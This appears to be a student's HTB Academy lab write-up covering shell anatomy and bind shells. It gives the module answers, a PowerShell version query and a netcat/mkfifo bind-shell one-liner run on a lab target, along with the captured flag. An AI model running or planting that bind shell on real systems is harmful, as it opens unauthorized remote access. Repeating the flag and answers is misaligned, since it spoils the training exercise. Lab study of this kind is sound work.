# Anatomy of a Shell

- Which two shell languages did we experiment with in this section? (Format: shellname&shellname)
**`bash&powershell`**

- In Pwnbox issue the $PSversiontable variable using PowerShell. Submit the edition of PowerShell that is running as the answer.
```powershell
PS [10.10.14.124] /home/htb-ac-539570 > echo $PSversiontable

Name                           Value
----                           -----
PSVersion                      7.5.0
PSEdition                      Core
GitCommitId                    7.5.0
OS                             Parrot Security 6.3 (lorikeet)
Platform                       Unix
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0…}
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1
WSManStackVersion              3.0
```

# Bind Shells

- Des is able to issue the command nc -lvnp 443 on a Linux target. What port will she need to connect to from her attack box to successfully establish a shell session? ANS: 443
- SSH to the target, create a bind shell, then use netcat to connect to the target using the bind shell you set up. When you have completed the exercise, submit the contents of the flag.txt file located at /customscripts.

```zsh
❯ ssh htb-student@10.129.106.191
```

On target:
```bash
htb-student@ubuntu:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 0.0.0.0 1234 > /tmp/f
```

On VM
```zsh
exec bash --login
nc -nv 10.129.81.57 1234
(UNKNOWN) [10.129.81.57] 1234 (?) open
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

htb-student@ubuntu:~$ 
htb-student@ubuntu:~$ cat /customscripts/flag.txt 
B1nD_Shells_r_cool

```

